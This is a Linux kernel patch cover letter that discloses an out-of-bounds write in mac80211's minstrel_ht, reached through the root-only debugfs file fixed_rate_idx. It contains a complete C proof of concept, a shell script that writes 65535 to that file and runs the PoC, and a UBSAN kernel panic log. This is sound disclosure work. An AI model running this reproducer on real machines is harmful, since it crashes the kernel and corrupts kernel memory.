Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DADA42D9ECB
	for <stable@vger.kernel.org>; Sat, 19 Sep 2026 08:46:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789807599; cv=none; b=AxgSguIcgS52YptvZPWKgTcmqmbPdhGTW1qV6Di+QEb7Q71nEC+mMHeB+fbuTNE8fgjyKmA0c/Me2IN2Dd/2hj35cEBRIdlVbYqP4Olv3h6Hm0tTeQ93LaskugGKkbh0kYtwwqUvz5ne/egYwc6NLDaAV6cZgFV1Y3bavEtke6A=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789807599; c=relaxed/simple;
	bh=1kAdUm1qRGzqCvxmQzfS/8Tmf9oBeii2UUAMX50Xo6U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=OYhJJzsv+C6FcwQY8Q76jXJE3izJQSTOboZRhDL9qTNw/66dyKYSeI8ExKbvkegeqHwe0wAuKSykP4UkYh+drfWhMaDak+MRZyWYKAsRih+t8Yu0plAIcqTGquli2YvgpSHdyk5nzjpNVFZk/7inx8W3tjVR4VNuSKBPX4jB+pY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rl7N7qtQ; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rl7N7qtQ"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-398cb5615deso1725240a91.3
        for <stable@vger.kernel.org>; Sat, 19 Sep 2026 01:46:35 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789807595; x=1790412395; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=63zRKGpq5qFWsyyrMrHKRXUqdWCkAu+Zycd6ARGXV8Y=;
        b=rl7N7qtQ6h/mh5EBq51V2XEA0e94XTv6ryWj4VlnR58hxCbkewxSpgMb1eZ84YZl/y
         Gxr+sfkBJdpjsanLGRRa50/taDWiFa6L2q+Q8qAU5eR5uzD1oUsykHPT4qOQVdeY9u6f
         4IZqnhmOPQa/Kpdjr00cjISjGpyzm2sMBeorVUrii3UZKlOtCRGtGlOafm0dyRBElnb9
         OTZfV9YWdOl9FG+aBmDuCDPQmqRD+WGq4IzWLHjeUGPLbb5wd6PGZiY5bL8SFTxiPPev
         OU9VSBgV99Jh7FUJ4JcdpXDX+HcKZ8AnVilBiDSJTppq1ofydHBIkovlNweZzeyJbZC9
         y/cw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789807595; x=1790412395;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=63zRKGpq5qFWsyyrMrHKRXUqdWCkAu+Zycd6ARGXV8Y=;
        b=JnQ6n0Wm6HzEajc4tAfM5GtLbAKTCq4dIcxOSkN0G5IBkFCHFhB/EgtFslBdg8Yp7W
         RsWc9c88BEdmOZVc7f9zM7x9EfGkK/y8QtbvmqKDm/Fgl03mUZPorY4DelUcNAcMLadh
         Xdp3db3YF4ScgPH1aeyXbX/yIeGRqJ3jvVabGZsw0T0Dt7/qYtPXmhSFtaLJA4jaTvnS
         xrmxmOVsWtYmB8QrWPLQlTMKV1TT8CpphVBEvDgJZlcbjuk1STUm88xzVfT67nDnPV59
         YEKPZyTSmTQjZ3NK5MvLLBahHa19He4Be0moOLU/VltHPVhGXo1qWN0Gg42IwlpS/WqU
         lByA==
X-Forwarded-Encrypted: i=1; AKwUvBzo2rQ4iayDXwAnfSzyjNmvyuV8CUQCKtLkcSWngcrbfbyGpiKZlQ0hVT82w9q6ji+TZIj9KhE=@vger.kernel.org
X-Gm-Message-State: AFuF++lgkj7O5w9ZcJ9aPAUb6j/DEGlET8wfHB7LH+6JtQgrdkepE778
	C3MM5Ye0wsP9yZXiZq51QBgOx8c/g/l8elqbzzlj3GbGO1/hJHgJXiNs
X-Gm-Gg: AYBFou0PhcLRPetOGyZThYAe/jkvapGsNYRVpfTmBeDVhX7c/K5B5Rb5zpU+Tmb0Fup
	cns3kfvl5aLZv+S60XhMpeUMkF+zzgVdZ3WvFdOphQF4fLn48thLtqwTFwCymEC1W842Z09/G6T
	KCUgd1ZrSWZI4GpJEq9WZWmiDVIaEwtCMw9qsowEoNmFDvdexpVuS7inR9b4g+/k23dqoZFXybd
	jKQU0f7L9Lc71mfKLTd8oLEVxaFvoJNydcbSGeKhMIjkBlgIbSccg94JO6zDhgHl1/oUmLeZCZj
	Q1xXSWzQ3yf4/nAQW5MPy+zhj/y57Um1xADdS0VXvgUskARSaPu+wbeqgpnEFv0LnfmMGmnT1mQ
	7CLJMbOaAqLcQFkwiHuqPN98Fy6xyZ4UWf48cx5+YYggdND9cVm+iJFwNDNx2niWL0SmwiCqF23
	PBWKxNPkK8BLcnCkRBYCgoTz1F1CBGIiG1C9Szy9aAMB8X2tyAPADluRidYE0N/oNejUzBt9Og7
	zVEsqRV4gQzuSzCmiCLMYC9QiWEIXuWe8MtWWx8dnX2nPN+yz5gayfYrD36rT/7Vpq92A==
X-Received: by 2002:a17:90a:116:b0:39e:6c69:9b9e with SMTP id 98e67ed59e1d1-39e6c69b2a8mr2067130a91.67.1789807594653;
        Sat, 19 Sep 2026 01:46:34 -0700 (PDT)
Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6fb75539sm3121039a91.3.2026.09.19.01.46.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 19 Sep 2026 01:46:34 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: linux-wireless@vger.kernel.org
Cc: Johannes Berg <johannes@sipsolutions.net>,
	"John W . Linville" <linville@tuxdriver.com>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH 0/1] wifi: mac80211: minstrel_ht: validate fixed rate index
Date: Sat, 19 Sep 2026 16:46:19 +0800
Message-ID: <cover.1789798000.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/mac80211/rc80211_minstrel_ht.c.
The reproducer below runs as root in the guest: the fixed_rate_idx file
lives under a root-only debugfs mount, and the nl80211 IBSS commands used
to drive rate control require CAP_NET_ADMIN. It is therefore not a
privilege boundary; we still report it because the writable debugfs
attribute lets an out-of-bounds access corrupt kernel memory.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

minstrel_ht_add_debugfs() exposes fixed_rate_idx as a plain u32
attribute, so any value can be written to it. minstrel_ht_update_stats()
copies that value into mi->max_tp_rate[] and mi->max_prob_rate, which are
u16 rate indexes; on the next rate table update minstrel_ht_set_rate()
decodes it with MI_RATE_GROUP()/MI_RATE_IDX() and indexes
minstrel_mcs_groups[] (42 entries) and mi->groups[].rates[] (10 entries).

Writing 65535, for example, decodes to group 4095 and rate index 15.
minstrel_mcs_groups[4095] is read out of bounds, and
mi->groups[4095].rates[15] is then dereferenced and updated as a
struct minstrel_rate_stats (retry counts etc.), corrupting adjacent
kernel memory. With CONFIG_UBSAN_BOUNDS the access is reported as
"array-index-out-of-bounds in minstrel_ht_set_rate()".

The patch replaces the u32 attribute with a debugfs attribute that only
accepts a rate index whose group is within minstrel_mcs_groups[] and
whose rate is within MCS_GROUP_RATES, plus U32_MAX, which remains the
value that disables fixed rate processing.

Reproducer:

 cd /root
 gcc -O2 -o poc poc.c
 echo 65535 > /sys/kernel/debug/ieee80211/phy0/rc/fixed_rate_idx
 ./poc wlan0 wlan1

The PoC drives mac80211_hwsim through raw nl80211: it switches wlan0 and
wlan1 to IBSS and joins both to the same cell, which reaches
rate_control_rate_init() -> minstrel_ht_update_rates() ->
minstrel_ht_set_rate() with the tainted fixed index.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU/KVM environment with
CONFIG_MAC80211_HWSIM, CONFIG_UBSAN_BOUNDS and panic_on_warn=1.

packetdrill cannot drive the nl80211 IBSS setup required to reach
minstrel_ht, so the PoC uses raw netlink. The crash log is raw dmesg
output; the stack trace is already symbolized.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif
#ifndef NLA_NEXT
#define NLA_NEXT(nla, len) \
	((len) -= NLA_ALIGN((nla)->nla_len), \
	 (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#endif
#ifndef NLA_OK
#define NLA_OK(nla, len) \
	((len) >= (int)sizeof(struct nlattr) && \
	 (nla)->nla_len >= sizeof(struct nlattr) && \
	 (nla)->nla_len <= (len))
#endif

struct nl_ctx {
	int fd;
	uint32_t seq;
	uint32_t portid;
};

struct set_iftype_arg {
	uint32_t ifindex;
	uint32_t iftype;
};

struct join_ibss_arg {
	uint32_t ifindex;
	const char *ssid;
	uint32_t freq;
	uint8_t bssid[6];
};

static int nla_put(char *buf, size_t bufsize, int *msg_len,
		   uint16_t attrtype, const void *data, uint16_t datalen)
{
	int offset = NLMSG_ALIGN(*msg_len);
	int attr_len = NLA_HDRLEN + datalen;
	int new_len = offset + NLA_ALIGN(attr_len);
	struct nlattr *nla;

	if ((size_t)new_len > bufsize)
		return -EMSGSIZE;

	nla = (struct nlattr *)(buf + offset);
	nla->nla_type = attrtype;
	nla->nla_len = attr_len;
	if (datalen)
		memcpy((char *)nla + NLA_HDRLEN, data, datalen);
	memset((char *)nla + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);

	*msg_len = new_len;
	return 0;
}

static int nla_put_flag(char *buf, size_t bufsize, int *msg_len, uint16_t attrtype)
{
	return nla_put(buf, bufsize, msg_len, attrtype, NULL, 0);
}

static int nl_open(struct nl_ctx *ctx)
{
	struct sockaddr_nl addr;
	socklen_t alen;

	memset(ctx, 0, sizeof(*ctx));
	ctx->fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (ctx->fd < 0)
		return -errno;

	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;

	if (bind(ctx->fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		int err = -errno;
		close(ctx->fd);
		return err;
	}

	alen = sizeof(addr);
	if (getsockname(ctx->fd, (struct sockaddr *)&addr, &alen) == 0)
		ctx->portid = addr.nl_pid;

	return 0;
}

static int nl_send_recv(struct nl_ctx *ctx, const void *req, size_t req_len,
			int (*cb)(struct nlmsghdr *, void *), void *cb_arg)
{
	struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
	struct iovec iov = { .iov_base = (void *)req, .iov_len = req_len };
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char buf[8192];
	int done = 0;

	if (sendmsg(ctx->fd, &msg, 0) < 0)
		return -errno;

	while (!done) {
		ssize_t len = recv(ctx->fd, buf, sizeof(buf), 0);
		struct nlmsghdr *nlh;

		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (nlh = (struct nlmsghdr *)buf;
		     NLMSG_OK(nlh, (unsigned int)len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			if (nlh->nlmsg_seq != ctx->seq)
				continue;

			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);

				if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(*e)))
					return -EINVAL;
				if (e->error)
					return e->error;
				return 0;
			}

			if (nlh->nlmsg_type == NLMSG_DONE)
				return 0;

			if (cb) {
				int r = cb(nlh, cb_arg);

				if (r)
					return r;
			}

			if (!(nlh->nlmsg_flags & NLM_F_MULTI))
				done = 1;
		}
	}

	return 0;
}

static int parse_family_id_cb(struct nlmsghdr *nlh, void *arg)
{
	struct genlmsghdr *ghdr;
	struct nlattr *nla;
	int len;
	uint16_t *family_id = arg;

	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
	len = nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*ghdr));
	nla = (struct nlattr *)((char *)ghdr + GENL_HDRLEN);

	while (NLA_OK(nla, len)) {
		if (nla->nla_type == CTRL_ATTR_FAMILY_ID &&
		    nla->nla_len >= NLA_HDRLEN + sizeof(uint16_t)) {
			memcpy(family_id, NLA_DATA(nla), sizeof(uint16_t));
			return 1;
		}
		nla = NLA_NEXT(nla, len);
	}

	return 0;
}

static int get_family_id(struct nl_ctx *ctx, const char *name)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *ghdr;
	uint16_t family_id = 0;
	int msg_len;
	int err;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = ++ctx->seq;
	nlh->nlmsg_pid = ctx->portid;

	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
	ghdr->cmd = CTRL_CMD_GETFAMILY;
	ghdr->version = 1;

	msg_len = nlh->nlmsg_len;
	err = nla_put(buf, sizeof(buf), &msg_len, CTRL_ATTR_FAMILY_NAME,
		      name, (uint16_t)(strlen(name) + 1));
	if (err)
		return err;

	nlh->nlmsg_len = msg_len;
	err = nl_send_recv(ctx, buf, nlh->nlmsg_len, parse_family_id_cb, &family_id);
	if (err < 0)
		return err;
	if (!family_id)
		return -ENOENT;

	return family_id;
}

static int nl80211_cmd(struct nl_ctx *ctx, uint16_t family_id, uint8_t cmd,
		       int (*builder)(char *, size_t, int *, void *), void *arg)
{
	char buf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *ghdr;
	int msg_len;
	int err;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	nlh->nlmsg_type = family_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = ++ctx->seq;
	nlh->nlmsg_pid = ctx->portid;

	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
	ghdr->cmd = cmd;
	ghdr->version = 0;

	msg_len = nlh->nlmsg_len;
	if (builder) {
		err = builder(buf, sizeof(buf), &msg_len, arg);
		if (err)
			return err;
	}

	nlh->nlmsg_len = msg_len;
	return nl_send_recv(ctx, buf, nlh->nlmsg_len, NULL, NULL);
}

static int build_set_iftype(char *buf, size_t buflen, int *msg_len, void *arg)
{
	struct set_iftype_arg *a = arg;
	int err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_IFINDEX,
		      &a->ifindex, sizeof(a->ifindex));
	if (err)
		return err;

	return nla_put(buf, buflen, msg_len, NL80211_ATTR_IFTYPE,
		       &a->iftype, sizeof(a->iftype));
}

static int build_join_ibss(char *buf, size_t buflen, int *msg_len, void *arg)
{
	struct join_ibss_arg *a = arg;
	uint32_t beacon_interval = 100;
	int err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_IFINDEX,
		      &a->ifindex, sizeof(a->ifindex));
	if (err)
		return err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_SSID,
		      a->ssid, (uint16_t)strlen(a->ssid));
	if (err)
		return err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_MAC,
		      a->bssid, sizeof(a->bssid));
	if (err)
		return err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_WIPHY_FREQ,
		      &a->freq, sizeof(a->freq));
	if (err)
		return err;

	err = nla_put(buf, buflen, msg_len, NL80211_ATTR_BEACON_INTERVAL,
		      &beacon_interval, sizeof(beacon_interval));
	if (err)
		return err;

	return nla_put_flag(buf, buflen, msg_len, NL80211_ATTR_FREQ_FIXED);
}

static int set_iftype_adhoc(struct nl_ctx *ctx, uint16_t family_id, const char *ifname)
{
	struct set_iftype_arg arg;
	int ifindex = if_nametoindex(ifname);

	if (!ifindex)
		return -errno;

	arg.ifindex = (uint32_t)ifindex;
	arg.iftype = NL80211_IFTYPE_ADHOC;
	return nl80211_cmd(ctx, family_id, NL80211_CMD_SET_INTERFACE,
			   build_set_iftype, &arg);
}

static int join_ibss(struct nl_ctx *ctx, uint16_t family_id, const char *ifname,
		     const char *ssid, uint32_t freq)
{
	struct join_ibss_arg arg;
	int ifindex = if_nametoindex(ifname);

	if (!ifindex)
		return -errno;

	arg.ifindex = (uint32_t)ifindex;
	arg.ssid = ssid;
	arg.freq = freq;
	arg.bssid[0] = 0x02;
	arg.bssid[1] = 0xaa;
	arg.bssid[2] = 0xbb;
	arg.bssid[3] = 0xcc;
	arg.bssid[4] = 0xdd;
	arg.bssid[5] = 0xee;

	return nl80211_cmd(ctx, family_id, NL80211_CMD_JOIN_IBSS,
			   build_join_ibss, &arg);
}

int main(int argc, char **argv)
{
	struct nl_ctx ctx;
	const char *if0 = "wlan0";
	const char *if1 = "wlan1";
	const char *ssid = "n4k-poc";
	uint32_t freq = 2412;
	char cmd[128];
	int family_id;
	int err;

	if (argc > 1)
		if0 = argv[1];
	if (argc > 2)
		if1 = argv[2];

	err = nl_open(&ctx);
	if (err) {
		fprintf(stderr, "nl_open: %s\n", strerror(-err));
		return 1;
	}

	family_id = get_family_id(&ctx, "nl80211");
	if (family_id < 0) {
		fprintf(stderr, "get_family_id: %s\n", strerror(-family_id));
		close(ctx.fd);
		return 1;
	}

	err = set_iftype_adhoc(&ctx, (uint16_t)family_id, if0);
	if (err) {
		fprintf(stderr, "set_iftype(%s): %s (%d)\n", if0, strerror(-err), err);
		close(ctx.fd);
		return 1;
	}

	err = set_iftype_adhoc(&ctx, (uint16_t)family_id, if1);
	if (err) {
		fprintf(stderr, "set_iftype(%s): %s (%d)\n", if1, strerror(-err), err);
		close(ctx.fd);
		return 1;
	}

	snprintf(cmd, sizeof(cmd), "ip link set %s up", if0);
	if (system(cmd) != 0) {
		fprintf(stderr, "failed to set %s up\n", if0);
		close(ctx.fd);
		return 1;
	}

	snprintf(cmd, sizeof(cmd), "ip link set %s up", if1);
	if (system(cmd) != 0) {
		fprintf(stderr, "failed to set %s up\n", if1);
		close(ctx.fd);
		return 1;
	}

	err = join_ibss(&ctx, (uint16_t)family_id, if0, ssid, freq);
	if (err) {
		fprintf(stderr, "join_ibss(%s): %s (%d)\n", if0, strerror(-err), err);
		close(ctx.fd);
		return 1;
	}

	err = join_ibss(&ctx, (uint16_t)family_id, if1, ssid, freq);
	if (err) {
		fprintf(stderr, "join_ibss(%s): %s (%d)\n", if1, strerror(-err), err);
		close(ctx.fd);
		return 1;
	}

	printf("IBSS join commands submitted. If fixed_rate_idx is invalid, kernel should crash shortly.\n");
	close(ctx.fd);
	return 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/sh
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$SCRIPT_DIR"

if [ "$(id -u)" -ne 0 ]; then
	echo "Run as root (needs debugfs + nl80211 admin operations)." >&2
	exit 1
fi

gcc -O2 -Wall -Wextra -o poc poc.c

ip link set wlan0 down || true
ip link set wlan1 down || true

echo 65535 > /sys/kernel/debug/ieee80211/phy0/rc/fixed_rate_idx

./poc wlan0 wlan1

sleep 5

------END poc.sh--------

-----BEGIN crash log-----

[    1.048940] ------------[ cut here ]------------
[    1.048944] UBSAN: array-index-out-of-bounds in /home/lucas/work/net-mrl-921/net/mac80211/rc80211_minstrel_ht.c:1446:54
[    1.048946] index 4095 is out of range for type 'mcs_group [42]'
[    1.048952] CPU: 1 UID: 0 PID: 46 Comm: kworker/u8:2 Not tainted 7.3.0-rc2-00458-gfefaac1176bf #1 PREEMPT(lazy) 
[    1.048956] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[    1.048960] Workqueue: events_unbound cfg80211_wiphy_work
[    1.048996] Call Trace:
[    1.049015]  <TASK>
[    1.049019]  dump_stack_lvl+0x4d/0x70
[    1.049046]  ubsan_epilogue+0x5/0x2b
[    1.049060]  __ubsan_handle_out_of_bounds.cold+0x4e/0x58
[    1.049063]  minstrel_ht_set_rate+0x57a/0x7d0
[    1.049081]  ? minstrel_ht_update_caps.isra.0+0x5ec/0x970
[    1.049084]  ? minstrel_ht_update_rates+0x3a/0x340
[    1.049086]  minstrel_ht_update_rates+0x76/0x340
[    1.049088]  rate_control_rate_init+0xc5/0x160
[    1.049104]  ieee80211_ibss_finish_sta+0xbb/0x160
[    1.049110]  ieee80211_ibss_work+0xda/0x480
[    1.049112]  ? update_load_avg+0x5c/0x330
[    1.049122]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.049126]  ? update_cfs_rq_load_avg+0x1a/0x240
[    1.049131]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.049133]  ? skb_dequeue+0x58/0x80
[    1.049147]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.049148]  ? ieee80211_iface_work+0x22c/0x540
[    1.049151]  cfg80211_wiphy_work+0xb5/0x170
[    1.049159]  process_one_work+0x19d/0x390
[    1.049174]  worker_thread+0x169/0x2d0
[    1.049176]  ? __pfx_worker_thread+0x10/0x10
[    1.049178]  kthread+0xe1/0x120
[    1.049186]  ? __pfx_kthread+0x10/0x10
[    1.049188]  ret_from_fork+0x196/0x260
[    1.049200]  ? __pfx_kthread+0x10/0x10
[    1.049202]  ? __pfx_kthread+0x10/0x10
[    1.049203]  ret_from_fork_asm+0x1a/0x30
[    1.049209]  </TASK>
[    1.049210] ---[ end trace ]---
[    1.049211] Kernel panic - not syncing: UBSAN: panic_on_warn set ...

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  wifi: mac80211: minstrel_ht: validate fixed rate index

 net/mac80211/rc80211_minstrel_ht.c | 30 ++++++++++++++++++++++++++++--
 1 file changed, 28 insertions(+), 2 deletions(-)


base-commit: fefaac1176bf3cf002a8dc83339d6ed6a369941a
-- 
2.55.0

